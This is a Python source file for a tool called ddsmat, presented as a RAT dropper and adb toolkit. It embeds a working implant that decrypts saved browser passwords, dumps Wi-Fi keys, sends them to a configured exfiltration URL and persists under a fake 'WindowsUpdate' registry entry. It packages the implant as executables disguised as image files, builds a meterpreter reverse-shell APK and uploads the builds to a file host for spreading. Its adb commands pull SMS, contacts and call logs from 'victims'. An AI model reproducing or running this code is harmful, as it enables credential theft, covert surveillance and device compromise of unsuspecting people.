#!/usr/bin/env python3
"""ddsmat — termux RAT dropper + adb toolkit. /help for commands."""
import os
import sys
import json
import time
import shlex
import shutil
import socket
import sqlite3
import tempfile
import subprocess
from pathlib import Path

try:
    import readline
except Exception:
    pass

BASE = Path(__file__).resolve().parent
BUILDS = BASE / "builds"
BUILDS.mkdir(exist_ok=True)

BANNER = r"""
   ___  ___  ___  __  __    _  _____
  |   \|   \/ __|  \/  |   /_\|_   _|
  | |) | |) \__ \ |\/| |  / _ \ | |
  |___/|___/|___/_|  |_| /_/ \_\|_|

  ddsmat — /help for commands
"""

IMPLANT_SRC = r'''
import os, sys, json, time, socket, platform, subprocess, tempfile, sqlite3, shutil
from pathlib import Path
from urllib.request import Request, urlopen

CONFIG_JSON = {}

def _post(url, token, payload):
    try:
        data = json.dumps(payload).encode()
        req = Request(url, data=data, headers={"Content-Type":"application/json","X-Token":token})
        urlopen(req, timeout=15).read()
    except Exception:
        pass

def _dpapi_decrypt(blob):
    import ctypes, ctypes.wintypes as wt
    class DATA_BLOB(ctypes.Structure):
        _fields_ = [("cbData", wt.DWORD), ("pbData", ctypes.POINTER(ctypes.c_char))]
    crypt32 = ctypes.windll.crypt32
    kernel32 = ctypes.windll.kernel32
    bin_blob = DATA_BLOB(len(blob), ctypes.cast(ctypes.create_string_buffer(blob), ctypes.POINTER(ctypes.c_char)))
    out_blob = DATA_BLOB()
    if not crypt32.CryptUnprotectData(ctypes.byref(bin_blob), None, None, None, None, 0, ctypes.byref(out_blob)):
        raise OSError("dpapi fail")
    data = ctypes.string_at(out_blob.pbData, out_blob.cbData)
    kernel32.LocalFree(out_blob.pbData)
    return data

def _browsers_win():
    local = os.environ.get("LOCALAPPDATA",""); roaming = os.environ.get("APPDATA","")
    targets = [("Chrome", Path(local)/"Google/Chrome/User Data"),
               ("Edge", Path(local)/"Microsoft/Edge/User Data"),
               ("Brave", Path(local)/"BraveSoftware/Brave-Browser/User Data"),
               ("Opera", Path(roaming)/"Opera Software/Opera Stable"),
               ("Vivaldi", Path(local)/"Vivaldi/User Data")]
    for name, base in targets:
        if not base.exists(): continue
        for prof in list(base.glob("Default")) + list(base.glob("Profile *")):
            db = prof/"Login Data"
            if db.exists(): yield name, db

def _chromium_pw(db_path):
    tmp = Path(tempfile.gettempdir())/f"ld_{os.getpid()}_{db_path.parent.name}.db"
    try: shutil.copy2(db_path, tmp)
    except Exception: return []
    out = []
    try:
        con = sqlite3.connect(str(tmp)); cur = con.cursor()
        cur.execute("SELECT origin_url, username_value, password_value FROM logins")
        for url, user, blob in cur.fetchall():
            if not blob: continue
            try: pw = _dpapi_decrypt(blob).decode(errors="replace")
            except Exception: pw = "(fail)"
            out.append({"url":url,"user":user,"password":pw})
        con.close()
    except Exception: pass
    try: tmp.unlink()
    except Exception: pass
    return out

def _wifi_win():
    out = []
    try:
        p = subprocess.run(["netsh","wlan","show","profiles"], capture_output=True, text=True, timeout=20)
        for line in p.stdout.splitlines():
            if "All User Profile" in line:
                ssid = line.split(":",1)[1].strip()
                r = subprocess.run(["netsh","wlan","show","profile",f"name={ssid}","key=clear"],
                                   capture_output=True, text=True, timeout=15)
                key = ""
                for l in r.stdout.splitlines():
                    if "Key Content" in l: key = l.split(":",1)[1].strip(); break
                out.append({"ssid":ssid,"key":key})
    except Exception: pass
    return out

def collect():
    s = platform.system()
    data = {"host":socket.gethostname(),"os":f"{s} {platform.release()}",
            "user":os.environ.get("USERNAME") or os.environ.get("USER","?"),
            "time":int(time.time()),"passwords":[],"wifi":[]}
    if s == "Windows":
        for bname, db in _browsers_win():
            for c in _chromium_pw(db):
                c["browser"] = bname; data["passwords"].append(c)
        data["wifi"] = _wifi_win()
    return data

def persist_win():
    try:
        me = sys.executable if getattr(sys,"frozen",False) else __file__
        ap = Path(os.environ["APPDATA"])/"ddsmat"; ap.mkdir(exist_ok=True)
        dst = ap/"svchost.exe"; shutil.copy2(me, dst)
        import winreg
        k = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(k, "WindowsUpdate", 0, winreg.REG_SZ, str(dst))
        winreg.CloseKey(k)
    except Exception: pass

def main():
    cfg = CONFIG_JSON or {}
    data = collect()
    url = cfg.get("exfil_url"); tok = cfg.get("exfil_token","")
    if url: _post(url, tok, data)
    try:
        (Path(tempfile.gettempdir())/"ddsmat_out.json").write_text(json.dumps(data, indent=2))
    except Exception: pass
    if cfg.get("persist") and platform.system()=="Windows":
        try: persist_win()
        except Exception: pass

if __name__ == "__main__":
    try: main()
    except Exception: pass
'''

CONFIG_EXAMPLE = {"exfil_url": "", "exfil_token": "", "persist": True}


# ==================================================================
# BUILD
# ==================================================================
def _safe(name):
    import re
    return re.sub(r"[^A-Za-z0-9._-]", "_", name)


def _png_to_ico(png, ico):
    from PIL import Image
    Image.open(png).convert("RGBA").save(
        ico, sizes=[(16,16),(32,32),(48,48),(64,64),(128,128),(256,256)])


def _bake(out):
    src = IMPLANT_SRC.replace("CONFIG_JSON = {}",
                              f"CONFIG_JSON = {json.dumps(CONFIG_EXAMPLE)!r}")
    out.write_text(src)
    return out


def _pyinstaller(src_py, ico, name, out_dir, windows):
    work = Path(tempfile.mkdtemp())
    spec = _safe(name)
    cmd = ["pyinstaller", "--onefile", "--clean", "--noupx",
           "--exclude-module", "tkinter",
           "--exclude-module", "unittest",
           "--exclude-module", "pydoc",
           "--name", spec,
           "--distpath", str(out_dir),
           "--workpath", str(work / "b"),
           "--specpath", str(work / "s")]
    if windows:
        cmd.append("--noconsole")
        if ico:
            cmd += ["--icon", str(ico)]
    cmd.append(str(src_py))
    r = subprocess.run(cmd, capture_output=True, text=True)
    if r.returncode != 0:
        raise RuntimeError(f"pyinstaller: {r.stderr[-400:]}")
    for c in out_dir.glob(f"{spec}*"):
        if c.is_file():
            return c
    raise RuntimeError("pyinstaller produced nothing")


def build(image_path, base_name, target, out_dir):
    out_dir = Path(out_dir); out_dir.mkdir(parents=True, exist_ok=True)
    cache = out_dir / f".cache_{target}"

    if cache.exists() and cache.stat().st_size > 5000:
        print("[ddsmat] using cached build (instant)")
        if target == "windows":
            display = f"{_safe(base_name)}.jpg.exe"
        elif target == "linux":
            display = f"{_safe(base_name)}.jpg"
        else:
            display = f"{_safe(base_name)}.apk"
        final = out_dir / display
        shutil.copy2(cache, final)
        if target == "linux":
            final.chmod(0o755)
        return final, display

    print("[ddsmat] first build for this target — 1-3 min on phone")
    baked = out_dir / f".baked_{int(time.time())}_{base_name}.py"
    _bake(baked)

    ico = out_dir / f"{_safe(base_name)}.ico"
    try:
        _png_to_ico(image_path, ico)
    except Exception:
        ico = None

    if target == "windows":
        if not shutil.which("pyinstaller"):
            baked.unlink(missing_ok=True); raise RuntimeError("pip install pyinstaller")
        exe = _pyinstaller(baked, ico, _safe(base_name), out_dir, True)
        display = f"{_safe(base_name)}.jpg.exe"
        final = out_dir / display
        shutil.move(str(exe), str(final))
    elif target == "linux":
        if not shutil.which("pyinstaller"):
            baked.unlink(missing_ok=True); raise RuntimeError("pip install pyinstaller")
        binp = _pyinstaller(baked, ico, _safe(base_name), out_dir, False)
        display = f"{_safe(base_name)}.jpg"
        final = out_dir / display
        shutil.move(str(binp), str(final)); final.chmod(0o755)
    elif target == "android":
        if not shutil.which("msfvenom"):
            baked.unlink(missing_ok=True); raise RuntimeError("pkg install metasploit")
        final = out_dir / f"{_safe(base_name)}.apk"
        r = subprocess.run(["msfvenom","-p","android/meterpreter/reverse_tcp",
                            "LHOST=127.0.0.1","LPORT=4444","-o",str(final),
                            "--arch","dalvik"], capture_output=True, text=True)
        if r.returncode != 0:
            baked.unlink(missing_ok=True); raise RuntimeError(f"msfvenom: {r.stderr[-300:]}")
        display = final.name
    else:
        baked.unlink(missing_ok=True); raise ValueError(f"unknown target {target}")

    shutil.copy2(final, cache)
    baked.unlink(missing_ok=True)
    print(f"[ddsmat] cached → {cache.name}")
    return final, display


# ==================================================================
# ADB
# ==================================================================
def _adb(args, serial=None, timeout=30):
    b = shutil.which("adb")
    if not b:
        return "(adb not installed — pkg install android-tools)"
    cmd = [b] + (["-s", serial] if serial else []) + args
    try:
        p = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
        return (p.stdout or "") + (p.stderr or "")
    except subprocess.TimeoutExpired:
        return "(adb timeout)"
    except Exception as e:
        return f"(adb error: {e})"


def adb_devices():
    out = _adb(["devices"])
    devs = []
    for line in out.splitlines()[1:]:
        parts = line.strip().split()
        if len(parts) >= 2 and parts[1] == "device":
            devs.append(parts[0])
    return devs


def adb_steal(serial=None):
    lines = ["=== adb STEAL ==="]
    devs = adb_devices()
    if not devs:
        lines.append("no adb devices.")
        return "\n".join(lines)
    serial = serial or devs[0]
    lines.append(f"target: {serial}")
    lines.append("\n[accounts]")
    lines.append(_adb(["shell","dumpsys","account"], serial)[:2500])
    lines.append("\n[wifi]")
    out = _adb(["shell","su","-c","cat /data/misc/wifi/WifiConfigStore.xml"], serial)
    lines.append(out[:3000] if out.strip() and "Permission denied" not in out else "(no root)")
    lines.append("\n[packages]")
    lines.append(_adb(["shell","pm","list","packages"], serial)[:2000])
    return "\n".join(lines)


def adb_phone(serial, what="all"):
    lines = [f"=== adb PHONE ({what}) — {serial} ==="]
    if serial not in adb_devices():
        lines.append("device not connected.")
        return "\n".join(lines)
    if what in ("contacts","all"):
        lines.append("\n[CONTACTS]")
        lines.append(_adb(["shell","content","query","--uri","content://com.android.contacts/data/phones",
                           "--projection","display_name:data1"], serial)[:4000] or "(none)")
    if what in ("sms","all"):
        lines.append("\n[SMS]")
        lines.append(_adb(["shell","content","query","--uri","content://sms/inbox",
                           "--projection","address:body:date"], serial)[:5000] or "(none)")
    if what in ("calls","all"):
        lines.append("\n[CALLS]")
        lines.append(_adb(["shell","content","query","--uri","content://call_log/calls",
                           "--projection","number:duration:type:date"], serial)[:4000] or "(none)")
    return "\n".join(lines)


# ==================================================================
# HELPERS
# ==================================================================
def _pick_file():
    tmp = Path(tempfile.gettempdir()) / f"ddsmat_pick_{int(time.time())}"
    if shutil.which("termux-storage-get"):
        try:
            subprocess.run(["termux-storage-get", str(tmp)], timeout=180)
            if tmp.exists() and tmp.stat().st_size > 0:
                return tmp
        except Exception:
            pass
    try:
        p = input("path to image: ").strip()
        if p:
            pp = Path(p).expanduser()
            if pp.exists():
                return pp
    except Exception:
        pass
    return None


def _download_image(url):
    import urllib.request
    try:
        name = url.split("/")[-1].split("?")[0]
        if not name or "." not in name:
            name = f"img_{int(time.time())}.png"
        tmp = Path(tempfile.gettempdir()) / name
        req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
        with urllib.request.urlopen(req, timeout=30) as r:
            tmp.write_bytes(r.read())
        if tmp.stat().st_size > 0:
            print(f"[ddsmat] downloaded {tmp.stat().st_size/1024:.1f} KB → {tmp.name}")
            return tmp
    except Exception as e:
        print(f"[ddsmat] download failed: {e}")
    return None


def _upload_0x0(path):
    try:
        p = subprocess.run(["curl","-s","-F",f"file=@{path}","https://0x0.st"],
                           capture_output=True, text=True, timeout=180)
        url = (p.stdout or "").strip()
        if url.startswith("http"):
            return url
    except Exception:
        pass
    return ""


# ==================================================================
# COMMANDS
# ==================================================================
def cmd_help(_=None):
    print("""
ddsmat commands:

  /image <url> [name] [target]     paste an image URL, get a ratted link back
  /image                            open the file picker instead
  /link [file]                      get upload link for a file
  /steal [serial]                   dump saved passwords (adb)
  /phone <serial> [what]            contacts | sms | calls | all
  /victims                          list adb-connected devices
  /ls                               list builds
  /open <name>                      path to a build
  /rebuild [target]                 clear cached payload
  /help /exit

targets: windows (default) | linux | android
""")


def cmd_image(args):
    """ /image <url|path> [name] [target] """
    src = None
    name = "invoice"
    target = "windows"

    if args:
        first = args[0]
        if first.startswith(("http://", "https://")):
            print("[ddsmat] downloading image …")
            src = _download_image(first)
            if src is None:
                return
            if len(args) > 1: name = args[1]
            if len(args) > 2: target = args[2]
        else:
            p = Path(first).expanduser()
            if p.exists():
                src = p
                if len(args) > 1: name = args[1]
                if len(args) > 2: target = args[2]
            else:
                name = first
                if len(args) > 1: target = args[1]

    if src is None:
        print("[ddsmat] opening picker …")
        src = _pick_file()
        if src is None:
            print("[ddsmat] no file.")
            return

    if target not in ("windows", "linux", "android"):
        print("bad target (windows/linux/android)")
        return

    print(f"[ddsmat] building {target} from {src.name} …")
    try:
        out, display = build(src, name, target, BUILDS)
    except Exception as e:
        print(f"[ddsmat] failed: {e}")
        return

    print(f"[ddsmat] built: {out}  ({out.stat().st_size/1024:.1f} KB)")
    print("[ddsmat] uploading …")
    url = _upload_0x0(out)
    if url:
        print(f"[ddsmat] link: {url}")
    else:
        print(f"[ddsmat] local: {out.resolve()}")
        print(f"[ddsmat] share: termux-share -a send {out}")


def cmd_link(args):
    if args:
        p = Path(args[0]).expanduser()
    else:
        files = [f for f in sorted(BUILDS.glob("*"))
                 if f.is_file() and not f.name.startswith(".")]
        if not files:
            print("no builds.")
            return
        p = files[-1]
        print(f"[ddsmat] latest: {p.name}")
    if not p.exists():
        print("no such file")
        return
    print("[ddsmat] uploading …")
    url = _upload_0x0(p)
    print(f"[ddsmat] link: {url}" if url else f"[ddsmat] local: {p.resolve()}")


def cmd_steal(args):
    print(adb_steal(args[0] if args else None))


def cmd_phone(args):
    if not args:
        print("usage: /phone <serial> [all|contacts|sms|calls]")
        return
    print(adb_phone(args[0], args[1] if len(args) > 1 else "all"))


def cmd_victims(_):
    devs = adb_devices()
    if not devs:
        print("no adb devices.")
        return
    for d in devs:
        print(f"  {d}")


def cmd_ls(_):
    files = [f for f in sorted(BUILDS.glob("*"))
             if f.is_file() and not f.name.startswith(".")]
    if not files:
        print("no builds.")
        return
    for f in files:
        print(f"  {f.name}  ({f.stat().st_size/1024:.1f} KB)")


def cmd_open(args):
    if not args:
        print("usage: /open <name>")
        return
    p = BUILDS / args[0]
    if not p.exists():
        m = list(BUILDS.glob(f"*{args[0]}*"))
        if m:
            p = m[0]
        else:
            print("not found")
            return
    print(p.resolve())


def cmd_rebuild(args):
    target = args[0] if args else "windows"
    cache = BUILDS / f".cache_{target}"
    if cache.exists():
        cache.unlink()
        print(f"[ddsmat] cache for {target} cleared.")
    else:
        print(f"[ddsmat] no cache for {target}.")


def cmd_exit(_=None):
    print("bye.")
    sys.exit(0)


CMDS = {
    "/help":    cmd_help,
    "/image":   cmd_image,
    "/link":    cmd_link,
    "/share":   cmd_link,
    "/steal":   cmd_steal,
    "/phone":   cmd_phone,
    "/victims": cmd_victims,
    "/ls":      cmd_ls,
    "/open":    cmd_open,
    "/rebuild": cmd_rebuild,
    "/exit":    cmd_exit,
    "/quit":    cmd_exit,
}


def main():
    print(BANNER)
    while True:
        try:
            line = input("ddsmat> ").strip()
        except (EOFError, KeyboardInterrupt):
            print()
            break
        if not line:
            continue
        if not line.startswith("/"):
            if line.startswith("!"):
                os.system(line[1:])
                continue
            print("commands start with '/'  (/help)")
            continue
        parts = shlex.split(line)
        h = CMDS.get(parts[0])
        if not h:
            print(f"unknown: {parts[0]}  (/help)")
            continue
        try:
            h(parts[1:])
        except Exception as e:
            print(f"[ddsmat] error: {e}")


if __name__ == "__main__":
    main()
